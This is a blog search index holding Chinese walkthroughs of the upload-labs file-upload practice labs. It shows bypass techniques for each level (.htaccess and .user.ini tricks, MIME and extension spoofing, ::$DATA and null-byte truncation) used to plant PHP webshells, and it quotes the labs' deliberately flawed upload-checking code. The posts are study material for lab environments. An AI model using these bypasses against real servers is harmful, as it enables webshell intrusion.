<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>再战upload</title>
      <link href="/2024/08/04/%E5%86%8D%E6%88%98upload/"/>
      <url>/2024/08/04/%E5%86%8D%E6%88%98upload/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继upload-labs靶场过后，博主又搜集到了一个评价不错的文件上传靶场，出自国光师傅的<a href="https://github.com/sqlsec/upload-labs-docker">upload-labs-docker</a>。里面有详细的搭建过程，故本文不再赘述。借此机会可以温习以下之前学过的知识，本次靶场共有13关，废话不多说，开始打靶！</p><h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><h3 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h3><p>访问靶机ip地址，映入眼帘的就是一个大大的<strong>javascript</strong>，不用多想，妥妥的<strong>js前端验证</strong>。上传一个<strong>shell.php</strong>试试<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042246328.png" alt="image-20240804224642018"></p><p>果然有弹窗，老办法，禁用javascript试试，发现上传成功。用蚁剑连接试试<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042253402.png" alt="image-20240804225323324"></p><h3 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h3><p>同样，本关给了提示，要用<code>.htaccess</code>文件绕过，编写<code>.htaccess</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该文件的意思是将<code>.jpg</code>为后缀的文件当作<code>.php</code>文件进行解析</p><p>随后上传<code>shell.jpg</code>为一句话木马，用蚁剑连接<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042333525.png" alt="image-20240804233340420"></p><h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>本关为<strong>MIME</strong>绕过，用bp抓包进行修改<code>content-type</code>字段就行<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042339985.png" alt="image-20240804233953810"></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042341076.png" alt="image-20240804234116958"></p><h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p>本关用文件头绕过，直接用bp抓包在php文件前面加上<code>GIF89a</code>，同时修改<code>conten-type</code>即可<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042353442.png" alt="image-20240804235355323"></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042354640.png" alt="image-20240804235423560"></p><h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p>观察源代码发现为黑名单过滤并且有个<code>str_ireplace</code>函数，会将在黑名单中的后缀名替换为空字符<code>&quot;&quot;</code>。于是直接尝试双写绕过，直接上传<code>shell.pphphp</code>发现上传成功，用蚁剑连接<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408050001811.png" alt="image-20240805000157729"></p><h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p>本关和<strong>pass-05</strong>不同的点就在于windows和linux对不同后缀的处理不一样，对于linux来说，后缀名的大小写是一样的，即<code>.Php</code>和<code>.php</code>一样，但是对于windows来说，它们是有区别的。于是尝试上传<code>.Php</code>为后缀的一句话木马，发现上传成功。</p></div>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 基本漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs文件上传靶场全通关</title>
      <link href="/2024/07/18/upload-labs%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3/"/>
      <url>/2024/07/18/upload-labs%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><h3 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><p>从GitHub上面直接下载源码<a href="https://github.com/c0ny1/upload-labs">upload-labs</a>，用phpstudy搭建靶场，将下载解压后的文件放到WWW文件目录下即可，如出现一下界面即为搭建成功</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182047505.png"></p><h3 id="二、靶场实战"><a href="#二、靶场实战" class="headerlink" title="二、靶场实战"></a>二、靶场实战</h3><h4 id="pass-01（前端绕过）"><a href="#pass-01（前端绕过）" class="headerlink" title="pass-01（前端绕过）"></a><strong>pass-01</strong>（前端绕过）</h4><p>直接上传一个一句话木马shell.php试试，发现一个弹窗，只允许上传jpg、png、gif类型的文件。</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182049287.png"></p><p>很显然，这是一个js前端验证，即在前端界面就限制了上传文件的类型，上传的文件甚至都没有到后端的数据库，所以更别谈解析了。解决方法也很简单，直接关闭浏览器的前端验证就行。这里以火狐浏览器为例，在搜索栏输入<code>about:config</code>，发现如下界面，搜索<code>javascript</code>，找到<code>javascript.enabled</code>关闭就行</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182057192.png"></p><p>再次上传shell.php发现上传成功</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182100249.png"></p><p>之后直接用蚁剑连接就行了</p><h4 id="pass-02（MIME验证）"><a href="#pass-02（MIME验证）" class="headerlink" title="pass-02（MIME验证）"></a>pass-02（MIME验证）</h4><p>上传shell.php，这次没有前端弹窗，直接显示了上传文件类型不正确，查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是**MIME(Multipurpose Internet Mail Extensions )**验证，事实上对文件的后缀名并没有验证，只需用burpsuite进行抓包修改<code>content-type</code>字段就行</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182200860.png"></p><p>之后直接用蚁剑连接就行了</p><h4 id="pass-03（特殊后缀绕过）"><a href="#pass-03（特殊后缀绕过）" class="headerlink" title="pass-03（特殊后缀绕过）"></a>pass-03（特殊后缀绕过）</h4><p>直接分析源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难看出，这关是一个黑名单过滤，不许上传.asp、.aspx、.php、.jsp后缀的文件，黑名单绕过相对比白名单简单一些的，毕竟，列举出所有可能的文件后缀还是有点难度的，漏掉一个都可能导致上传木马成功，这关过滤的后缀名比较少，尝试其它等效的php后缀名，例如php3，php5，phtml等等</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407191703193.png"></p><p>此关注意要将配置文件改成<code>AddTypeapplication/x-httpd-php .php .phtml .php5 .php3</code></p><p>这段代码的意思是将.php .phtml .php5 .php3的文件当作php文件解析，之后用蚁剑连接就行</p><h4 id="pass-04（-htaccess文件）"><a href="#pass-04（-htaccess文件）" class="headerlink" title="pass-04（.htaccess文件）"></a>pass-04（.htaccess文件）</h4><p>本关引入一个新的文件：**.htaccess文件**</p><p><strong>.htaccess</strong>文件时Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过**.htaccess**文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能。</p><p>这样我们就可以通过**.htaccess<strong>文件将.jpg文件解析为.php文件，创建</strong>.htaccess**文件如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该文件的意思是将所有.&#x2F;jpg后缀的文件解析为php文件</p><p>查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现又是黑名单过滤，不过这次过滤了一长串，第三问提出的其他后缀名也都被过滤掉了，所以可以尝试上传**.htaccess**文件之后，在上传一个.jpg后缀的一句话木马，之后用蚁剑连接就行了</p><h4 id="pass-05（-user-ini）"><a href="#pass-05（-user-ini）" class="headerlink" title="pass-05（.user.ini）"></a>pass-05（.user.ini）</h4><p>查看源码发现把第四关的.htaccess文件过滤掉了，所以必须另寻他法。发现有**.user.ini**文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.ini ： 自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用.htaccess 文件有同样效果。</span><br><span class="line"></span><br><span class="line">除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web根目录（$_SERVER[&#x27;DOCUMENT_ROOT&#x27;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</span><br><span class="line"></span><br><span class="line">在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI设置可被识别。两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。 user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。 user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</span><br></pre></td></tr></table></figure><p><strong>php.ini</strong> 是 php的配置文件，**.user.ini** 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。</p><p>但是想要引发 .user.ini 解析漏洞需要三个前提条件：</p><p>1、服务器脚本语言为PHP  </p><p>2、服务器使用CGI／FastCGI模式  </p><p>3、上传目录下要有可执行的php文件</p><p>编写**.user.ini**文件如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure><p>接着上传一句话木马shell.jpg，此时直接用用蚁剑连接返回值是为空的，查看提示知道还有一个<strong>readme.php</strong>，连接这个php文件就可以连接成功了</p><h4 id="pass-06（大写绕过）"><a href="#pass-06（大写绕过）" class="headerlink" title="pass-06（大写绕过）"></a>pass-06（大写绕过）</h4><p>查看源码发现把第五关的.ini后缀过滤了，对比之前的源码，发现少了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>于是我们可以尝试用大写绕过，上传<strong>shell.Php</strong>，用蚁剑连接就行了</p><h4 id="pass-07（空格绕过）"><a href="#pass-07（空格绕过）" class="headerlink" title="pass-07（空格绕过）"></a>pass-07（空格绕过）</h4><p>对比之前的源码发现没有</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>该行代码是将上传文件最后的空格去掉，于是本关尝试用空格绕过，由于windows会自动将文件名最后的空格去掉，所以用burpsuite抓包修改文件名在最后面加上一个空格发现上传成功，之后用蚁剑连接就行了</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407201340478.png"></p><h4 id="pass-08（点绕过）"><a href="#pass-08（点绕过）" class="headerlink" title="pass-08（点绕过）"></a>pass-08（点绕过）</h4><p>查看源码发现少了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p>于是我们可以尝试用点绕过，即上传<code>shell.php.</code>，发现上传成功并解析成功，直接用蚁剑连接</p><h4 id="pass-09（-DATA绕过）"><a href="#pass-09（-DATA绕过）" class="headerlink" title="pass-09（::DATA绕过）"></a>pass-09（::DATA绕过）</h4><p>查看源码发现少了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>于是可以尝试用<code>::$DATA</code>来绕过，用bp抓包并在后缀名后面加上<code>::$DATA</code></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407212358757.png"></p><p>上传成功，蚁剑连接的时候注意要把后面的<code>::$DATA</code>去掉再连接</p><h4 id="pass-10（点加空格绕过）"><a href="#pass-10（点加空格绕过）" class="headerlink" title="pass-10（点加空格绕过）"></a>pass-10（点加空格绕过）</h4><p>查看源码发现前面的关卡的绕过姿势都被ban了，只能另寻他路，发现<code>deldot</code>函数有个特性，其检查点是从右往左检查点，但是遇到空格会停下来，于是不难想到我们可以通过<code>. .</code>来绕过，即上传<code>shell.php. .</code>来绕过</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220011997.png"></p><p>接下来用蚁剑连接即可</p><h4 id="pass-11（双写绕过）"><a href="#pass-11（双写绕过）" class="headerlink" title="pass-11（双写绕过）"></a>pass-11（双写绕过）</h4><p>查看源码可知</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p>采用str_ireplace函数来替换掉文件名包含的黑名单后缀名，将其值替换为空字符串，于是可以尝试双写绕过<br>既可以上传<code>shell.pphphp</code>，由于这个函数只进行一次，故会将pphphp中间的php去掉，后缀名就变为了php</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220032308.png" alt="image-20240722003221113"></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220034488.png" alt="image-20240722003454419"></p><p>发现上传的图片的文件名确实变成了<code>shell.php</code>，用蚁剑连接即可</p><h4 id="pass-12（GET-00截断）"><a href="#pass-12（GET-00截断）" class="headerlink" title="pass-12（GET %00截断）"></a>pass-12（GET %00截断）</h4><p><strong>ps：本关复现条件：</strong></p><p><strong>1、php版本小于5.3.29</strong></p><p><strong>2、magic_quotes_gpc &#x3D; Off</strong></p><p>查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 